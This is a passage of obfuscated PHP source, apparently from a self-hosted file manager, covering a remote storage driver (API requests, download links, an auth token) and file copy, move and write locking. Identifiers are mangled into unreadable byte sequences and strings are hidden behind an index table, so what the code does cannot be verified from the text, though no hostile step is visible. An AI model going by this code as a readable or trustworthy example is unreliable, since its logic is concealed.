$¸ßùÕ‡‹[$ÖÜ„úíñ[206]] . $ÖÜ„úíñ[1066], $ÖÜ„úíñ[1585] => $ƒÆøÅû  . $ÖÜ„úíñ[1134] . $ŸöÍ…å¼[$ÖÜ„úíñ[580]][$ÖÜ„úíñ[1582]] . $ÖÜ„úíñ[1586] . LNG($ÖÜ„úíñ[1587]) . $ÖÜ„úíñ[1134] . $¼ñÆı·Ê, $ÖÜ„úíñ[1588] => LNG($ÖÜ„úíñ[1589]) . $ÖÜ„úíñ[1590] . $ŸöÍ…å¼[$ÖÜ„úíñ[580]][$ÖÜ„úíñ[1582]] . $ÖÜ„úíñ[285] . LNG($ÖÜ„úíñ[1591]) . $ÖÜ„úíñ[1590] . $ÏĞ¯„‹[$ÖÜ„úíñ[602]], $ÖÜ„úíñ[1583] => array($ÖÜ„úíñ[32] => $¼ñÆı·Ê, $ÖÜ„úíñ[1592] => $ÖÜ„úíñ[1593]), $ÖÜ„úíñ[1594] => Action($ÖÜ„úíñ[1540])->shareTargetMake($Ë˜Íöœ±[$ÖÜ„úíñ[1550]])); $®©£Ğ´ [$Ë˜Íöœ±[$ÖÜ„úíñ[687]]] = $ßâİ›Ô«; } unset($¹¼É€›[$ÖÜ„úíñ[191]]); unset($¹¼É€›[$ÖÜ„úíñ[604]]); unset($¹¼É€›[$ÖÜ„úíñ[188]]); unset($¹¼É€›[$ÖÜ„úíñ[589]]); $¹¼É€›[$ÖÜ„úíñ[1595]] = !0; $¹¼É€›[$ÖÜ„úíñ[232]] = $ŸöÍ…å¼[$ÖÜ„úíñ[1557]]; $¹¼É€›[$ÖÜ„úíñ[233]] = $ŸöÍ…å¼[$ÖÜ„úíñ[1558]]; $¹¼É€›[$ÖÜ„úíñ[502]] = $ŸöÍ…å¼[$ÖÜ„úíñ[1555]]; $¹¼É€›[$ÖÜ„úíñ[1583]] = $ßâİ›Ô«[$ÖÜ„úíñ[1583]]; $¹¼É€›[$ÖÜ„úíñ[1596]] = $Ë˜Íöœ±[$ÖÜ„úíñ[231]]; $¹¼É€›[$ÖÜ„úíñ[1597]] = $Ë˜Íöœ±[$ÖÜ„úíñ[88]]; $¹¼É€›[$ÖÜ„úíñ[1598]] = $ßâİ›Ô«[$ÖÜ„úíñ[1588]]; $¹¼É€›[$ÖÜ„úíñ[1594]] = $ßâİ›Ô«[$ÖÜ„úíñ[1594]]; $¹¼É€›[$ÖÜ„úíñ[687]] = $Ë˜Íöœ±[$ÖÜ„úíñ[687]]; $¹Ï§Å­ó = explode($ÖÜ„úíñ[8], trim($¹¼É€›[$ÖÜ„úíñ[602]], $ÖÜ„úíñ[8])); $¹Ï§Å­ó[0] = $ßâİ›Ô«[$ÖÜ„úíñ[1584]]; $¹¼É€›[$ÖÜ„úíñ[602]] = implode($ÖÜ„úíñ[8], $¹Ï§Å­ó); if (count($¹Ï§Å­ó) > 1) { unset($¹¼É€›[$ÖÜ„úíñ[1594]]); } if (count($¹Ï§Å­ó) == 1) { if ($¹¼É€›[$ÖÜ„úíñ[33]] == $ÖÜ„úíñ[78]) { $¹¼É€›[$ÖÜ„úíñ[32]] = $ßâİ›Ô«[$ÖÜ„úíñ[1584]]; } array_set_value($¹¼É€›, $ÖÜ„úíñ[1599], $ßâİ›Ô«[$ÖÜ„úíñ[1585]]); } $ó×ıá„ò = array($ÖÜ„úíñ[1600], $ÖÜ„úíñ[1520], $ÖÜ„úíñ[1601], $ÖÜ„úíñ[1602]); foreach ($ó×ıá„ò as $³¹êÛ€) { $Öòœ²Îû = $this->urlAuto(_get($¹¼É€›, $³¹êÛ€, $ÖÜ„úíñ[12])); if ($Öòœ²Îû) { array_set_value($¹¼É€›, $³¹êÛ€, $Öòœ²Îû); } } } private function _info($³îš…Á¿, $³ŒĞÁŒï = false) { $ı­‘ğşØ =& $_SERVER[©—Ò»ÅĞ]; $³ú÷Ã¹ = $this->_config; if (!$³ú÷Ã¹) { return !1; } static $×¡ôßúş = array(); if (isset($×¡ôßúş[$³îš…Á¿]) && is_array($×¡ôßúş[$³îš…Á¿])) { return $×¡ôßúş[$³îš…Á¿]; } if ((!$³îš…Á¿ || !trim($³îš…Á¿, $ı­‘ğşØ[8])) && !$³ŒĞÁŒï) { $®Ñê´è = $³ú÷Ã¹[$ı­‘ğşØ[580]][$ı­‘ğşØ[90]]; if (!$®Ñê´è) { return !1; } $®Ñê´è[$ı­‘ğşØ[602]] = $ı­‘ğşØ[12]; $®Ñê´è[$ı­‘ğşØ[87]] = $³ú÷Ã¹[$ı­‘ğşØ[1357]]; $this->pathInfoParse($®Ñê´è); return $®Ñê´è; } $ÒÌ°Şåˆ = $this->request($ı­‘ğşØ[1603], array($³îš…Á¿, $³ŒĞÁŒï)); $×¡ôßúş[$³îš…Á¿] = $ÒÌ°Şåˆ; return $ÒÌ°Şåˆ; } private function _fileSubstr($¶ä¨É‹¶, $âºÎ¨«ê = 0, $Ş¹õË½Ô = -1) { $­¦É·­ =& $_SERVER[©—Ò»ÅĞ]; $÷ÅËÛœà = $this->_fileLink($¶ä¨É‹¶); if (!$÷ÅËÛœà) { return !1; } $«öí±ò = !1; if ($Ş¹õË½Ô > 0) { $·ı‘ÜÂƒ = $Î›‚¢á + $Ş¹õË½Ô - 1; $«öí±ò = array($­¦É·­[1604] . $Î›‚¢á . $­¦É·­[476] . $·ı‘ÜÂƒ); } $÷§Í¶ÃĞ = url_request($÷ÅËÛœà, $­¦É·­[1605], !1, $«öí±ò); return $÷§Í¶ÃĞ[$­¦É·­[850]] ? $÷§Í¶ÃĞ[$­¦É·­[1392]] : !1; } private function _download($æóãèåË, $Èúß‹ê) { $ş—¡±­Œ = $this->_fileLink($æóãèåË); if (!$ş—¡±­Œ) { return !1; } Downloader::start($ş—¡±­Œ, $Èúß‹ê); return $Èúß‹ê; } private function _fileLink($¦Ë‰ñÒÓ, $²Øòå®¿ = '') { $ò–İƒ‚‚ =& $_SERVER[©—Ò»ÅĞ]; $ï„àûœ­ = $this->pathApiEncode($¦Ë‰ñÒÓ); return $this->requestMakeUrl($ò–İƒ‚‚[1606], array($ò–İƒ‚‚[87] => $ï„àûœ­)) . $²Øòå®¿; } private function urlAuto($Ë›³Æ¶) { $½İœÚï =& $_SERVER[©—Ò»ÅĞ]; if (!$Ë›³Æ¶) { return $Ë›³Æ¶; } $Á•‡ÆŠÎ = parse_url($Ë›³Æ¶); $¶şÔ˜è¬ = $Ë›³Æ¶; if ($this->_config[$½İœÚï[1556]] && $Á•‡ÆŠÎ[$½İœÚï[205]] == $½İœÚï[149] && Input::check($Á•‡ÆŠÎ[$½İœÚï[1607]], $½İœÚï[1608])) { $Ë›³Æ¶ = $½İœÚï[217] . substr($Ë›³Æ¶, 7); } $Ú‡¢«¼Ù = $½İœÚï[1609] . rawurlencode(rtrim($this->config[$½İœÚï[1553]], $½İœÚï[8])); if (strstr($Ë›³Æ¶, $Ú‡¢«¼Ù)) { $ÕİØÚÌÕ = strstr($Ë›³Æ¶, $½İœÚï[76]) ? $½İœÚï[284] : $½İœÚï[76]; $Ë›³Æ¶ = $Ë›³Æ¶ . $ÕİØÚÌÕ . $½İœÚï[1610] . $this->authToken; } return $Ë›³Æ¶; } private function request($ğüŒ“ÂÎ, $µ¶ÅòÕâ) { $–ÜÌÂû“ =& $_SERVER[©—Ò»ÅĞ]; if (!is_array($µ¶ÅòÕâ)) { $µ¶ÅòÕâ = array(); } for ($†ÈøÊ­ı = 0; $†ÈøÊ­ı < 4; $†ÈøÊ­ı++) { if (!isset($µ¶ÅòÕâ[$†ÈøÊ­ı])) { $µ¶ÅòÕâ[$†ÈøÊ­ı] = $–ÜÌÂû“[12]; } } $ÀÄ¸ÛÍ = array($–ÜÌÂû“[1603] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1603], $–ÜÌÂû“[1612] => $–ÜÌÂû“[1613], $–ÜÌÂû“[1614] => $–ÜÌÂû“[87], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[1615] => array(array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0])), $–ÜÌÂû“[1616] => $µ¶ÅòÕâ[1] ? $–ÜÌÂû“[91] : $–ÜÌÂû“[12])), $–ÜÌÂû“[1565] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1617], $–ÜÌÂû“[1612] => $–ÜÌÂû“[87], $–ÜÌÂû“[1614] => $–ÜÌÂû“[1618], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0], $–ÜÌÂû“[428] => _get($GLOBALS[$–ÜÌÂû“[7]], $–ÜÌÂû“[428], $–ÜÌÂû“[91]), $–ÜÌÂû“[439] => _get($GLOBALS[$–ÜÌÂû“[7]], $–ÜÌÂû“[439], $–ÜÌÂû“[1619]))), $–ÜÌÂû“[1620] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1621], $–ÜÌÂû“[1612] => $–ÜÌÂû“[87], $–ÜÌÂû“[1614] => $–ÜÌÂû“[1622], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0])), $–ÜÌÂû“[1566] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1623], $–ÜÌÂû“[1612] => $–ÜÌÂû“[87], $–ÜÌÂû“[1624] => $–ÜÌÂû“[1625], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0], $–ÜÌÂû“[168] => $µ¶ÅòÕâ[1])), $–ÜÌÂû“[1542] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1542], $–ÜÌÂû“[1612] => $–ÜÌÂû“[87], $–ÜÌÂû“[1624] => $–ÜÌÂû“[595], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0], $–ÜÌÂû“[168] => $µ¶ÅòÕâ[1], $–ÜÌÂû“[1580] => $µ¶ÅòÕâ[2])), $–ÜÌÂû“[1543] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1543], $–ÜÌÂû“[1612] => $–ÜÌÂû“[87], $–ÜÌÂû“[1624] => $–ÜÌÂû“[595], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0], $–ÜÌÂû“[1580] => $µ¶ÅòÕâ[2])), $–ÜÌÂû“[641] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1626], $–ÜÌÂû“[1612] => $–ÜÌÂû“[1627], $–ÜÌÂû“[1624] => $–ÜÌÂû“[1628], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[1615] => array(array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0])), $–ÜÌÂû“[87] => $µ¶ÅòÕâ[1], $–ÜÌÂû“[1580] => $µ¶ÅòÕâ[2])), $–ÜÌÂû“[643] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1629], $–ÜÌÂû“[1612] => $–ÜÌÂû“[1627], $–ÜÌÂû“[1624] => $–ÜÌÂû“[1628], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[1615] => array(array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0])), $–ÜÌÂû“[87] => $µ¶ÅòÕâ[1], $–ÜÌÂû“[1580] => $µ¶ÅòÕâ[2])), $–ÜÌÂû“[1334] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1630], $–ÜÌÂû“[1612] => $–ÜÌÂû“[1613], $–ÜÌÂû“[1614] => $–ÜÌÂû“[87], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[1615] => array(array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0])))), $–ÜÌÂû“[1546] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1631], $–ÜÌÂû“[1612] => $–ÜÌÂû“[87], $–ÜÌÂû“[1624] => $–ÜÌÂû“[595], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[87] => $µ¶ÅòÕâ[0], $–ÜÌÂû“[1632] => $µ¶ÅòÕâ[1])), $–ÜÌÂû“[107] => array($–ÜÌÂû“[1611] => $–ÜÌÂû“[1570], $–ÜÌÂû“[1612] => $–ÜÌÂû“[87], $–ÜÌÂû“[1624] => $–ÜÌÂû“[595], $–ÜÌÂû“[1356] => array($–ÜÌÂû“[87] => get_path_father($µ¶ÅòÕâ[0]), $–ÜÌÂû“[230] => $µ¶ÅòÕâ[1] ? $–ÜÌÂû“[1398] . $µ¶ÅòÕâ[1] : $–ÜÌÂû“[12], $–ÜÌÂû“[32] => get_path_this($µ¶ÅòÕâ[0]), $–ÜÌÂû“[1580] => $µ¶ÅòÕâ[2]))); $‡Ú„ü‘ = $ÀÄ¸ÛÍ[$ğüŒ“ÂÎ]; if (!$‡Ú„ü‘) { return !1; } $àËÆÀÄ¡ = $‡Ú„ü‘[$–ÜÌÂû“[1356]]; $ÍàºĞÔ† = explode($–ÜÌÂû“[50], $‡Ú„ü‘[$–ÜÌÂû“[1612]]); foreach ($ÍàºĞÔ† as $×ıŞŞæ) { $€¤ä´Ä¶ = $this->pathApiEncode(_get($àËÆÀÄ¡, $×ıŞŞæ)); array_set_value($àËÆÀÄ¡, $×ıŞŞæ, $€¤ä´Ä¶); } if ($ğüŒ“ÂÎ == $–ÜÌÂû“[1546] && trim($‡Ú„ü‘[$–ÜÌÂû“[1356]][$–ÜÌÂû“[87]], $–ÜÌÂû“[8]) == trim($this->_config[$–ÜÌÂû“[1357]], $–ÜÌÂû“[8])) { return $‡Ú„ü‘[$–ÜÌÂû“[1356]][$–ÜÌÂû“[87]]; } $ùçí = $this->requestSend($‡Ú„ü‘[$–ÜÌÂû“[1611]], $àËÆÀÄ¡); if (!$ùçí) { return !1; } $ƒË¹²ä¶ = $ùçí[$–ÜÌÂû“[1392]]; if ($‡Ú„ü‘[$–ÜÌÂû“[1624]]) { $ƒË¹²ä¶ = _get($ùçí, $‡Ú„ü‘[$–ÜÌÂû“[1624]]); } if (is_string($ƒË¹²ä¶) && !$‡Ú„ü‘[$–ÜÌÂû“[1614]]) { return $this->pathApiDecode($ƒË¹²ä¶); } if (!is_array($ƒË¹²ä¶) || !$ƒË¹²ä¶) { return $ƒË¹²ä¶; } $ğâ›ˆÛ÷ = explode($–ÜÌÂû“[50], $‡Ú„ü‘[$–ÜÌÂû“[1614]]); foreach ($ğâ›ˆÛ÷ as $×ıŞŞæ) { $ÇŞ£¤Ğö = explode($–ÜÌÂû“[10], $×ıŞŞæ); $ôÕ”£¢æ = array_search($–ÜÌÂû“[1633], $ÇŞ£¤Ğö); if ($ôÕ”£¢æ === !1) { $€¤ä´Ä¶ = $this->pathApiDecode(_get($ƒË¹²ä¶, $×ıŞŞæ)); array_set_value($ƒË¹²ä¶, $×ıŞŞæ, $€¤ä´Ä¶); if ($ğüŒ“ÂÎ == $–ÜÌÂû“[1603] && $×ıŞŞæ == $–ÜÌÂû“[87]) { $this->pathInfoParse($ƒË¹²ä¶); } if ($ğüŒ“ÂÎ == $–ÜÌÂû“[1565] && $×ıŞŞæ == $–ÜÌÂû“[1634]) { $this->pathInfoParse($ƒË¹²ä¶[$–ÜÌÂû“[967]]); } if ($ğüŒ“ÂÎ == $–ÜÌÂû“[1565]) { $ƒË¹²ä¶[$–ÜÌÂû“[1635]] = array(); } continue; } $ÃÍÍ„·Ë = implode($–ÜÌÂû“[10], array_slice($ÇŞ£¤Ğö, $ôÕ”£¢æ + 1)); $Ú–¶«­ = array(); if ($ôÕ”£¢æ === 0) { $Ú–¶«­ =& $ƒË¹²ä¶; } if ($ôÕ”£¢æ === 1) { $Ú–¶«­ =& $ƒË¹²ä¶[$ÇŞ£¤Ğö[0]]; } if ($ôÕ”£¢æ === 2) { $Ú–¶«­ =& $ƒË¹²ä¶[$ÇŞ£¤Ğö[0]][$ÇŞ£¤Ğö[1]]; } foreach ($Ú–¶«­ as $×ıŞŞæ => $¶â£‡ã›) { $€¤ä´Ä¶ = $this->pathApiDecode(_get($¶â£‡ã›, $ÃÍÍ„·Ë)); array_set_value($Ú–¶«­[$×ıŞŞæ], $ÃÍÍ„·Ë, $€¤ä´Ä¶); $this->pathInfoParse($Ú–¶«­[$×ıŞŞæ]); } unset($Ú–¶«­); } return $ƒË¹²ä¶; } private function requestMakeUrl($ƒ™‹ÔÅÚ, $õÂìˆü° = '') { $ÀÏÒ·§ =& $_SERVER[©—Ò»ÅĞ]; $¥Ç¤½ÖÂ = $this->_config; if (!$this->authToken) { return !1; } $¨ôª¤– = $this->requestQuery($õÂìˆü°, !0) . $ÀÏÒ·§[1636] . $this->authToken; $İ­ÌÆİ© = rtrim($¥Ç¤½ÖÂ[$ÀÏÒ·§[580]][$ÀÏÒ·§[1582]], $ÀÏÒ·§[8]) . $ÀÏÒ·§[1637] . $ƒ™‹ÔÅÚ; return $İ­ÌÆİ© . $ÀÏÒ·§[1638] . rawurlencode($¥Ç¤½ÖÂ[$ÀÏÒ·§[580]][$ÀÏÒ·§[1554]]) . $¨ôª¤–; } private function requestAuthToken() { $†¶¼ŞÑÓ =& $_SERVER[©—Ò»ÅĞ]; $è€»Ù´ = $this->_config; if (!$è€»Ù´) { return !1; } $›ÑŞ£Ù = _get($è€»Ù´, $†¶¼ŞÑÓ[1639]); $î’şòËŞ = array_find_by_field($è€»Ù´[$†¶¼ŞÑÓ[580]][$†¶¼ŞÑÓ[1594]], $†¶¼ŞÑÓ[1640], $›ÑŞ£Ù); if (!$î’şòËŞ) { return !1; } $Úã Ä = $î’şòËŞ[$†¶¼ŞÑÓ[1641]] . $†¶¼ŞÑÓ[1642] . $î’şòËŞ[$†¶¼ŞÑÓ[1347]]; $íÛ™ØØı = $†¶¼ŞÑÓ[1643] . $this->pathParse[$†¶¼ŞÑÓ[487]] . $†¶¼ŞÑÓ[476] . $Úã Ä; $£´·Ùì… = Cache::get($íÛ™ØØı); if ($£´·Ùì…) { return $£´·Ùì…; } $£´·Ùì… = Mcrypt::encode($Úã Ä, $†¶¼ŞÑÓ[1644]); Cache::set($íÛ™ØØı, $£´·Ùì…, 3600 * 24 * 60); return $£´·Ùì…; } private function requestQuery($¹õªì²÷ = '', $İÂ÷øÄõ = false) { if (!$¹õªì²÷ || !is_array($¹õªì²÷)) { return $¹õªì²÷; } foreach ($¹õªì²÷ as $Ê‘Åğñ => $ù•ÊæÕØ) { if (is_array($ù•ÊæÕØ)) { $¹õªì²÷[$Ê‘Åğñ] = json_encode($ù•ÊæÕØ); } } return $İÂ÷øÄõ ? $_SERVER[©—Ò»ÅĞ][284] . http_build_query($¹õªì²÷) : $¹õªì²÷; } private function requestSend($‚¥Ó£¢, $ûß²Å»Ö) { $‘—ÎóË¸ =& $_SERVER[©—Ò»ÅĞ]; $Öºª‰¡ = $this->requestMakeUrl($‚¥Ó£¢); if (!$Öºª‰¡) { return !1; } $¯İš¾Ëö = url_request($Öºª‰¡, $‘—ÎóË¸[288], $this->requestQuery($ûß²Å»Ö), !1, !1, !0); $ºÚğ®‡ = $¯İš¾Ëö[$‘—ÎóË¸[1392]]; if (!is_array($ºÚğ®‡) || !$ºÚğ®‡ || !$ºÚğ®‡[$‘—ÎóË¸[1402]] || intval($ºÚğ®‡[$‘—ÎóË¸[1402]]) > 500) { $Á é‡€Å = is_array($ºÚğ®‡) ? $ºÚğ®‡[$‘—ÎóË¸[1392]] : $ºÚğ®‡ . $‘—ÎóË¸[12]; if (!$¯İš¾Ëö[$‘—ÎóË¸[850]]) { $Á é‡€Å .= $‘—ÎóË¸[1645] . $¯İš¾Ëö[$‘—ÎóË¸[1402]] . $‘—ÎóË¸[175]; } IO::errorTips($Á é‡€Å, !1); return !1; } return $ºÚğ®‡; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¸‚ÖÏÍ’) { parent::__construct($¸‚ÖÏÍ’); $this->setSignVersion($_SERVER[©—Ò»ÅĞ][247]); } } goto E¿÷à²®„“; d‰ÄµòŒ«: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÄÆ˜ö¿) { $·¦’®¸€ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->allowLock()) { return; } $this->_lockCheck($·¦’®¸€[641], $ÄÆ˜ö¿); $Ãª †š² = 1; $this->_lockEvent($ÄÆ˜ö¿, array($·¦’®¸€[642], $·¦’®¸€[643]), $Ãª †š²); $this->_lockParent($ÄÆ˜ö¿, array($·¦’®¸€[643]), $Ãª †š²); $this->_lockEvent($ÄÆ˜ö¿, array($·¦’®¸€[644], $·¦’®¸€[645]), $Ãª †š²); $this->_lockCheckEnd($·¦’®¸€[641], $ÄÆ˜ö¿); } public function lockCopyEnd($ŸÉà‹õÒ) { $“ó•Æ¸ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->allowLock()) { return; } $¯úÖ¤ƒÈ = 0; $this->_lockEvent($ŸÉà‹õÒ, array($“ó•Æ¸[642], $“ó•Æ¸[643]), $¯úÖ¤ƒÈ); $this->_lockParent($ŸÉà‹õÒ, array($“ó•Æ¸[643]), $¯úÖ¤ƒÈ); $this->_lockEvent($ŸÉà‹õÒ, array($“ó•Æ¸[644], $“ó•Æ¸[645]), $¯úÖ¤ƒÈ); } public function lockWriteStart($È³Àµî‘, $©µàâ³ = '') { $‰›¿½õó =& $_SERVER[©—Ò»ÅĞ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‰›¿½õó[642], $È³Àµî‘); $–†–º›ã = 1; $this->_lockKey($‰›¿½õó[646] . $È³Àµî‘ . $‰›¿½õó[10] . $©µàâ³, $–†–º›ã); $this->_lockEvent($È³Àµî‘, array($‰›¿½õó[641], $‰›¿½õó[643]), $–†–º›ã); $this->_lockParent($È³Àµî‘, array($‰›¿½õó[641], $‰›¿½õó[643]), $–†–º›ã); $this->_lockCheckEnd($‰›¿½õó[642], $È³Àµî‘); } public function lockWriteEnd($ˆ”ŠÃÈÙ, $ÉÃ¤’  = '') { $¼Û¸‘¡É =& $_SERVER[©—Ò»ÅĞ]; if (!$this->allowLock()) { return; } $İğì–Ğ’ = 0; $this->_lockKey($¼Û¸‘¡É[646] . $ˆ”ŠÃÈÙ . $¼Û¸‘¡É[10] . $ÉÃ¤’ , $İğì–Ğ’); $this->_lockEvent($ˆ”ŠÃÈÙ, array($¼Û¸‘¡É[641], $¼Û¸‘¡É[643]), $İğì–Ğ’); $this->_lockParent($ˆ”ŠÃÈÙ, array($¼Û¸‘¡É[641], $¼Û¸‘¡É[643]), $İğì–Ğ’); } public function lockMoveStart($ÂĞ¸ôÔ÷) { $¶¼ÖİœÚ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¶¼ÖİœÚ[643], $ÂĞ¸ôÔ÷); $…ÆØËß— = 1; $this->_lockKey($¶¼ÖİœÚ[647] . $ÂĞ¸ôÔ÷, $…ÆØËß—); $this->_lockEvent($ÂĞ¸ôÔ÷, array($¶¼ÖİœÚ[641], $¶¼ÖİœÚ[642]), $…ÆØËß—); $this->_lockParent($ÂĞ¸ôÔ÷, array($¶¼ÖİœÚ[641], $¶¼ÖİœÚ[643]), $…ÆØËß—); $this->_lockEvent($ÂĞ¸ôÔ÷, array($¶¼ÖİœÚ[648], $¶¼ÖİœÚ[644], $¶¼ÖİœÚ[645]), $…ÆØËß—); $this->_lockCheckEnd($¶¼ÖİœÚ[643], $ÂĞ¸ôÔ÷); } public function lockMoveEnd($ÎÁ„Œ‹) { $²Ï—Æ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->allowLock()) { return; } $„„Ó±Í• = 0; $this->_lockKey($²Ï—Æ[647] . $ÎÁ„Œ‹, $„„Ó±Í•); $this->_lockEvent($ÎÁ„Œ‹, array($²Ï—Æ[641], $²Ï—Æ[642]), $„„Ó±Í•); $this->_lockParent($ÎÁ„Œ‹, array($²Ï—Æ[641], $²Ï—Æ[643]), $„„Ó±Í•); $this->_lockEvent($ÎÁ„Œ‹, array($²Ï—Æ[648], $²Ï—Æ[644], $²Ï—Æ[645]), $„„Ó±Í•); } private function _lockCheck($òêÚÏ×, $°ëôùì¯) { $Åëáš§¢ =& $_SERVER[©—Ò»ÅĞ]; $Ô–”Á = $this->sourceInfo($°ëôùì¯); $…²ÚßÖÔ = $òêÚÏ× . $Åëáš§¢[10] . $°ëôùì¯; $this->_lockTimeStart[$…²ÚßÖÔ] = timeFloat(); if (!is_array($Ô–”Á)) { return; } $™ı°Èæş = LNG($Åëáš§¢[649]); CacheLock::setErrorMsg($Åëáš§¢[173] . htmlspecialchars($Ô–”Á[$Åëáš§¢[32]]) . $Åëáš§¢[175] . $™ı°Èæş); $this->_lockKey($…²ÚßÖÔ, 1); $this->_lockKey($…²ÚßÖÔ, 0); $ şä®×œ = array_reverse($this->parentLevelArray($Ô–”Á[$Åëáš§¢[604]])); foreach ($ şä®×œ as $Úü†ŠÇû) { $…²ÚßÖÔ = $òêÚÏ× . $Åëáš§¢[650] . $Úü†ŠÇû; if (CacheLock::lockGet($Åëáš§¢[651] . $…²ÚßÖÔ)) { $Ô–”Á = $this->sourceInfo($Úü†ŠÇû); CacheLock::setErrorMsg($Åëáš§¢[173] . htmlspecialchars($Ô–”Á[$Åëáš§¢[32]]) . $Åëáš§¢[175] . $™ı°Èæş); $this->_lockKey($…²ÚßÖÔ, 1); $this->_lockKey($…²ÚßÖÔ, 0); } } } private function _lockCheckEnd($üİ˜Ì¼, $¢ÄŸèÕÊ) { $³–ÃÆİÍ =& $_SERVER[©—Ò»ÅĞ]; $ïâ‡Í‹Ï = $üİ˜Ì¼ . $³–ÃÆİÍ[10] . $¢ÄŸèÕÊ; CacheLock::setErrorMsg($³–ÃÆİÍ[463]); if (!isset($this->_lockTimeStart[$ïâ‡Í‹Ï])) { return; } $Â©¢«ûÏ = timeFloat() - $this->_lockTimeStart[$ïâ‡Í‹Ï]; unset($this->_lockTimeStart[$ïâ‡Í‹Ï]); if ($Â©¢«ûÏ > 0.5) { unset(self::$cacheSourceInfo[$³–ÃÆİÍ[547] . $¢ÄŸèÕÊ]); } $®ğìĞ¼ã = $this->sourceInfo($¢ÄŸèÕÊ); if (!$®ğìĞ¼ã) { show_json(LNG($³–ÃÆİÍ[105]), !1); } } private function _lockParent($²æõŸ °, $ùãĞÚùî, $Î“˜üêû) { if (!$this->autoLockSet) { return; } $œÄ‰ºä¿ = $this->sourceInfo($²æõŸ °); if (!is_array($œÄ‰ºä¿)) { return; } $ÖÆá “† = array_reverse($this->parentLevelArray($œÄ‰ºä¿[$_SERVER[©—Ò»ÅĞ][604]])); foreach ($ÖÆá “† as $€­ı) { $this->_lockEvent($€­ı, $ùãĞÚùî, $Î“˜üêû); } } private function _lockEvent($÷¸á—í, $ö™ÈØÕ, $„—‘ƒ˜Ÿ) { $‹÷æÎşÑ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->autoLockSet) { return; } foreach ($ö™ÈØÕ as $ºêœô´«) { $ëÓùŠ„‚ = $ºêœô´« . $‹÷æÎşÑ[10] . $÷¸á—í; if ($„—‘ƒ˜Ÿ && CacheLock::lockGet($‹÷æÎşÑ[651] . $ëÓùŠ„‚)) { continue; } $this->_lockKey($ëÓùŠ„‚, $„—‘ƒ˜Ÿ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¬Šòş‰, $Í•â¶«ú = 1) { $†ÁöÁä… = $_SERVER[©—Ò»ÅĞ][651] . md5($¬Šòş‰); if ($Í•â¶«ú) { if (isset(self::$_lockItemArr[$†ÁöÁä…])) { return; } self::$_lockItemArr[$†ÁöÁä…] = 1; CacheLock::lock($†ÁöÁä…, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$†ÁöÁä…])) { return; } unset(self::$_lockItemArr[$†ÁöÁä…]); CacheLock::unlock($†ÁöÁä…); } } public function isParentOf($ñ»ÛÊ·, $½Ê“şŠ”) { $ÄÁ‡Í’¬ =& $_SERVER[©—Ò»ÅĞ]; $³²£Æê = $this->sourceInfo($ñ»ÛÊ·); $¤À€°øô = $this->sourceInfo($½Ê“şŠ”); $¶åæ¥è± = $³²£Æê[$ÄÁ‡Í’¬[604]] . $³²£Æê[$ÄÁ‡Í’¬[191]] . $ÄÁ‡Í’¬[50]; $ØÓ¹Àë = $¤À€°øô[$ÄÁ‡Í’¬[604]] . $¤À€°øô[$ÄÁ‡Í’¬[191]] . $ÄÁ‡Í’¬[50]; $ß…Ú³Äã = strpos($ØÓ¹Àë, $¶åæ¥è±) === 0; return $ß…Ú³Äã; } private $targetIsDelete = 0; public function copy($×Ë³ÎŠŒ, $âúöÔ˜Ò, $¾—Ñıã€ = REPEAT_REPLACE, $Î¡ƒµÕÆ = '') { $«éâ£İÄ =& $_SERVER[©—Ò»ÅĞ]; $¾€ú ¦ñ = $this->sourceInfo($×Ë³ÎŠŒ); $Ö›™ »† = $this->sourceInfo($âúöÔ˜Ò); if (!$¾€ú ¦ñ || !$Ö›™ »† || $Ö›™ »†[$«éâ£İÄ[500]] != $«éâ£İÄ[91]) { return !1; } if ($this->isParentOf($×Ë³ÎŠŒ, $âúöÔ˜Ò)) { return !1; } $âÉº‰ò© = $Î¡ƒµÕÆ ? $Î¡ƒµÕÆ : $¾€ú ¦ñ[$«éâ£İÄ[32]]; $this->lockCopyStart($×Ë³ÎŠŒ); $this->lockWriteStart($âúöÔ˜Ò, $âÉº‰ò©); $êé•Çó = array($«éâ£İÄ[652] => array(), $«éâ£İÄ[653] => array(), $«éâ£İÄ[654] => array()); $this->targetIsDelete = intval($¾€ú ¦ñ[$«éâ£İÄ[520]]); $ÉÃ‘¯¾À = $this->fileNameExistAuto($âúöÔ˜Ò, $¾€ú ¦ñ); $ó”£áÁ¢ = $this->_copy($×Ë³ÎŠŒ, $âúöÔ˜Ò, 